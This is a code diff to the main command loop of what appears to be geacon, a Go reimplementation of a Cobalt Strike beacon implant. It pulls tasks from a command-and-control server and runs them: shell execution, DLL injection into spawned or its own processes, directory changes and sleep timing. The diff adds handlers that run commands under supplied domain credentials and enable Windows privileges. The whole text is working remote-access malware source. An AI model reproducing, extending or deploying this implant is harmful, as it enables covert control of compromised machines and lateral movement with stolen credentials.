@@ -23,10 +23,9 @@ func main() {
 		for {
 			resp, err := packet.PullCommand()
 			if err == nil {
-				//totalLen := resp.Response().ContentLength
 				totalLen := len(resp)
 				if totalLen > 0 {
-					// CS traffic end with 16 byte hash?
+					// end with 16 byte
 					respByte := resp
 					// hmacHash, useless
 					_ = respByte[totalLen-util.HmacHashLen:]
@@ -53,14 +52,9 @@ func main() {
 							var execErr error
 							execErr = nil
 							// replyType can be found at beacon.BeaconC2 process_beacon_callback_decrypted
-							// 32 means charset utf-8
 							switch cmdType {
 							case command.CMD_TYPE_CHECKIN:
 								_, execErr = packet.PullCommand()
-								if execErr != nil {
-									break
-								}
-							//geacon shell
 							case command.CMD_TYPE_SHELL:
 								var shellPath string
 								var shellBuf []byte
@@ -79,36 +73,41 @@ func main() {
 								}
 								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, []byte("exec success"))
 								packet.PushResult(finalPacket)
+							case command.CMD_TYPE_RUNAS:
+								var domain, username, password, cmd []byte
+								domain, username, password, cmd, execErr = command.ParseRunAs(cmdBuf)
+								if execErr != nil {
+									break
+								}
+								execErr = command.RunAs(domain, username, password, cmd)
+							case command.CMD_TYPE_GET_PRIVS:
+								var privs []string
+								var result string
+								privs, execErr = command.ParseGetPrivs(cmdBuf)
+								if execErr != nil {
+									break
+								}
+								result, execErr = command.GetPrivs(privs)
+								if execErr != nil {
+									break
+								}
+								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, []byte(result))
+								packet.PushResult(finalPacket)
 							// TODO have no idea about how to deal with token
 							case command.CMD_TYPE_SPAWN_TOKEN_X64:
 								fallthrough
 							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X64:
 								execErr = command.SpawnAndInjectDllX64(cmdBuf)
-								if execErr != nil {
-									break
-								}
 							case command.CMD_TYPE_SPAWN_TOKEN_X86:
 								fallthrough
 							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X86:
 								execErr = command.SpawnAndInjectDllX86(cmdBuf)
-								if execErr != nil {
-									break
-								}
 							case command.CMD_TYPE_INJECT_X86:
 								execErr = command.InjectDllSelfX86(cmdBuf)
-								if execErr != nil {
-									break
-								}
 							case command.CMD_TYPE_INJECT_X64:
 								execErr = command.InjectDllSelfX64(cmdBuf)
-								if execErr != nil {
-									break
-								}
 							case command.CMD_TYPE_JOB:
 								execErr = command.HandlerJob(cmdBuf)
-								if execErr != nil {
-									break
-								}
 							case command.CMD_TYPE_GET_UID:
 								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, []byte(sysinfo.GetUsername()))
 								packet.PushResult(finalPacket)
@@ -196,14 +195,8 @@ func main() {
 								packet.PushResult(finalPacket)
 							case command.CMD_TYPE_CD:
 								execErr = command.ChangeCurrentDir(cmdBuf)
-								if execErr != nil {
-									break
-								}
 							case command.CMD_TYPE_MAKEDIR:
 								execErr = command.MakeDir(string(cmdBuf))
-								if execErr != nil {
-									break
-								}
 							case command.CMD_TYPE_SLEEP:
 								sleep := packet.ReadInt(cmdBuf[:4])
 								jitter := packet.ReadInt(cmdBuf[4:8])
